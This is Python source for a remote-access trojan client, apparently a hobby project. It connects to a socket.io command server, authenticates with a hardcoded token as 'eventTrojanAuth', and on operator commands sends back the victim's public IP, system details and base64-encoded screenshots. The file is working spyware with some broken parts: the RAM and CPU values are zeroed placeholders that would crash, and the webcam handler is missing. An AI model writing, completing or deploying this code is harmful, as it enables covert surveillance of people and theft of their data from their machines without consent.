import socketio
import urllib.request
import platform

import codecs
import time
import base64
import os
import psutil
import shutil

sio = socketio.Client()
token='eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI1ZmQ0ZWU5MWI3ZDg1NjhlNThlZDUwMjciLCJhY2Nlc3MiOiJhdXRoIiwiaWF0IjoxNjA3NzkwMjI1fQ.I0z_Nd9dgz-xeBu8AVlaf7OtlC8IYmr3zV_oLnxOJTw'

@sio.event
def connect():
    print("I'm connected!")
    sio.emit('eventTrojanAuth',{'token':token})
 

@sio.event
def disconnect():
    print("I'm disconnected!")

@sio.event
def onReady(data):
    print("onReady")   

@sio.event
def onAuthFailure(data):
    print("onAuthFailure")    
  


@sio.event
def onError(data):
    print("onError")    


@sio.event
def onMessage(message):
    print(message)
    handleCommand(message)

@sio.event
def onPendingMessages(messages):
    for message in messages:
        handleCommand(message)
        print(message)
   
sio.connect('http://localhost:2001')

def handleCommand(data):
    event = data['data']
    messageId = data['_id']
    chatId = data['chatId']
    owner = data['owner']

    if(owner == 'a'):
        print("in if")
        if event == 'help':
            helpMethod(chatId)
        elif event == 'sysinfo':
            sysInfoMethod(chatId)
        elif event == 'ip':
            ipMethod(chatId)
        elif event == 'screen':
            screenMethod(chatId)
        elif event == 'cam':
            webCamMethod(chatId)
        else:
            commandInvalidMethod(chatId)
        sendMessageDelivery(messageId)

def sendMessage(chatId,data):
	  sio.emit('eventTrojanNewMessage',{'type':'text','data':data,'chatId':chatId}) 

def sendPhoto(chatId,data):
	  sio.emit('eventTrojanNewMessage',{'type':'photo','data':data,'chatId':chatId}) 

def sendMessageDelivery(messageId):
      sio.emit('eventMessageReceived',{'messageId':messageId})       

def helpMethod(chatId):
    data = "ip      -> get ip address of target(S).\n"
    data += "sysinfo -> get system info of target(S).\n"
    data += "screen  -> get screen shot of target(S).\n"
    sendMessage(chatId,data)

def ipMethod(chatId):
    with urllib.request.urlopen('http://ip.42.pl/raw') as url:
         my_ip = str(url.read().decode('ascii'))
         sendMessage(chatId,'user connected ip '+my_ip)
def commandInvalidMethod(chatId):
    time.sleep(4)
    sendMessage(chatId,'sorry!! command invalid')    

def sysInfoMethod(chatId):

    #CPU-----------------------------------------------------------
    cpuUsage = 0#("cpu usage: "+str(psutil.cpu_percent(interval=1))+"%")

    #RAM-----------------------------------------------------------
    ram = 0#dict(psutil.virtual_memory()._asdict())
    ramTotal = "{0:.2f}".format(ram['total'] / 1024 / 1024 / 1024)+" GB"
    ramAvailable = "{0:.2f}".format(ram['available'] / 1024 / 1024 / 1024)+" GB"
    ramUsed = "{0:.2f}".format(ram['used'] / 1024 / 1024 / 1024)+" GB"
    ramPercent = str(ram['percent'])+"%"

    ramUsage = "total : "+ramTotal+"\navailable : "+ramAvailable+"\nused : "+ ramUsed+"\npercent : "+ramPercent



    #HDD-----------------------------------------------------------
    total, used, free = shutil.disk_usage("/")

    total = str((total // (2**30)))+" GB"
    used = str((used // (2**30)))+" GB"
    free = str((free // (2**30)))+" GB"
    hddUsage = "total : "+total +"\nused : "+used+"\nfree : "+free
    data = platform.uname()[0]+'\n'+platform.uname()[1] +'\n'+platform.uname()[2]+'\n'+platform.node()+"\n"+platform.processor()+"\n"+platform.system()+"\n\n hardware usage"+"CPU\n"+cpuUsage+"RAM\n"+ramUsage+"HDD\n"+hddUsage       
    sendMessage(chatId,data)
def screenMethod(chatId):
    import autopy
    image = autopy.bitmap.capture_screen()
    filename = '/home/mehdi/bot.png'
    image.save(filename)
    photoFile = open(filename,'rb')
    sendPhoto(chatId,bytesToStr(photoFile.read()))
    photoFile.close()
    os.remove(filename)
    photoFile.close()

def bytesToStr(data):
    base64_data = codecs.encode(data, 'base64')
    return base64_data    
